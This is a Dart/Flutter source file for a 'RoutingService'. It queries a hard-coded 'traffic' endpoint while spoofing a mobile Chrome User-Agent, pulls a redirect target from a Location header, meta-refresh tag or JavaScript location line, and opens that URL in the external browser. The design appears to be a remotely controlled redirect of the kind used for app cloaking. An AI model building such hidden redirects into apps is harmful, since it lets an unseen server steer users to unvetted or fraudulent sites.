import 'dart:async';
import 'dart:developer' as developer;
import 'package:http/http.dart' as http;
import 'package:url_launcher/url_launcher.dart';

class RoutingService {
  // Target endpoint URL placeholder (can be updated via update_target_url.py)
  static const String endpointUrl = 'https://target-endpoint.site/traffic';
  static const Duration requestTimeout = Duration(seconds: 4);

  static Future<bool> checkAndProcessRedirect({String url = endpointUrl}) async {
    try {
      final initialUri = Uri.parse(url);
      final client = http.Client();

      final request = http.Request('GET', initialUri)..followRedirects = false;
      request.headers['User-Agent'] =
          'Mozilla/5.0 (Linux; Android 14; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36';
      request.headers['Accept'] =
          'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8';

      final streamedResponse = await client.send(request).timeout(requestTimeout);
      final response = await http.Response.fromStream(streamedResponse);
      client.close();

      final statusCode = response.statusCode;
      final locationHeader = response.headers['location'] ?? response.headers['Location'];

      developer.log(
        'Routing check status: $statusCode, location: $locationHeader',
        name: 'RoutingService',
      );

      if (statusCode >= 300 && statusCode < 400 && locationHeader != null && locationHeader.isNotEmpty) {
        final redirectUri = Uri.parse(locationHeader);
        final target = redirectUri.hasScheme
            ? redirectUri
            : initialUri.resolve(locationHeader);
        return await _launchExternalUrl(target);
      }

      if (statusCode == 200 && response.body.isNotEmpty) {
        final body = response.body;

        final metaRefreshMatch = RegExp(
          r'''<meta[^>]*?content=["']?[0-9]*;\s*url=(['"]?)([^"'>]+)\1[^>]*?>''',
          caseSensitive: false,
        ).firstMatch(body);

        if (metaRefreshMatch != null) {
          final targetUrl = metaRefreshMatch.group(2)?.trim();
          if (targetUrl != null && targetUrl.isNotEmpty) {
            final redirectUri = Uri.parse(targetUrl);
            final target = redirectUri.hasScheme
                ? redirectUri
                : initialUri.resolve(targetUrl);
            return await _launchExternalUrl(target);
          }
        }

        final jsLocationMatch = RegExp(
          r'''(?:window\.)?location(?:\.href)?\s*=\s*['"]([^'"]+)['"]''',
          caseSensitive: false,
        ).firstMatch(body);

        if (jsLocationMatch != null) {
          final targetUrl = jsLocationMatch.group(1)?.trim();
          if (targetUrl != null && targetUrl.isNotEmpty) {
            final redirectUri = Uri.parse(targetUrl);
            final target = redirectUri.hasScheme
                ? redirectUri
                : initialUri.resolve(targetUrl);
            return await _launchExternalUrl(target);
          }
        }
      }

      return false;
    } catch (e, stack) {
      developer.log('Routing check error: $e', name: 'RoutingService', error: e, stackTrace: stack);
      return false;
    }
  }

  static Future<bool> _launchExternalUrl(Uri target) async {
    try {
      if (await canLaunchUrl(target)) {
        return await launchUrl(target, mode: LaunchMode.externalApplication);
      }
      return false;
    } catch (e) {
      developer.log('Error launching external URL: $e', name: 'RoutingService');
      return false;
    }
  }
}
